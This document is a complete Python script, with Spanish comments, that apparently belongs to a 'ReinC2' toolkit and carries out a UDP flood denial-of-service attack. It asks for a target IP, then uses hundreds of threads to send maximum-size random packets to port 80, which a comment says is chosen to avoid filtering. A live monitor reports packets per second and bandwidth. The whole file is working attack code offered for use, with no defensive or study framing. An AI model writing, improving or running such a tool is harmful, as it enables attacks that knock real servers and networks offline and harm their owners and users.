import socket
import threading
import time
import random
import os

# === Configuración ===
ip = input("🎯 IP objetivo: ").strip()

try:
    duration = int(input("⏱ Duración en segundos (ej 120): ").strip())
except:
    duration = 60

try:
    threads = int(input("🧵 Número de threads (ej 500): ").strip())
except:
    threads = 500

try:
    packet_size = int(input("📦 Tamaño de paquete (máx 65507): ").strip())
    if packet_size > 65507:
        packet_size = 65507
except:
    packet_size = 65507

# Payload aleatorio para evitar patrones repetitivos
payload = random._urandom(packet_size)

# Tiempo de finalización
timeout = time.time() + duration

# Estadísticas globales
total_packets = 0
lock = threading.Lock()

# Monitor en tiempo real
def monitor():
    global total_packets
    last_packets = 0
    start_time = time.time()

    while time.time() < timeout:
        time.sleep(1)
        with lock:
            current_packets = total_packets
        
        # PPS y ancho de banda
        pps = current_packets - last_packets
        last_packets = current_packets
        bandwidth_mbps = (pps * packet_size * 8) / (1024 * 1024)

        elapsed = int(time.time() - start_time)
        remaining = max(0, duration - elapsed)

        os.system('clear' if os.name != 'nt' else 'cls')
        print(f"📡 ReinC2 Layer4 UDP Flood Monitor")
        print(f"{'-'*40}")
        print(f"🎯 IP objetivo     : {ip}")
        print(f"📦 Paquete         : {packet_size} bytes")
        print(f"🧵 Threads         : {threads}")
        print(f"⏱ Tiempo restante : {remaining}s")
        print(f"🧨 PPS actuales    : {pps}")
        print(f"🚀 Ancho de banda  : {bandwidth_mbps:.2f} Mbps")
        print(f"📤 Total paquetes  : {current_packets}")
        print(f"{'-'*40}")

# Flood UDP optimizado
def udp_flood():
    global total_packets
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target = (ip, 80)  # Usamos puerto 80 para menos filtrado
    while time.time() < timeout:
        try:
            sock.sendto(payload, target)
            with lock:
                total_packets += 1
        except:
            pass

# === Inicio ===
print(f"\n🔥 Iniciando UDP flood contra {ip} durante {duration}s con {threads} hilos...\n")

# Lanzar flood
for _ in range(threads):
    threading.Thread(target=udp_flood, daemon=True).start()

# Lanzar monitor
threading.Thread(target=monitor, daemon=True).start()

# Esperar hasta finalizar
while time.time() < timeout:
    time.sleep(1)

print("\n✅ Ataque finalizado.")
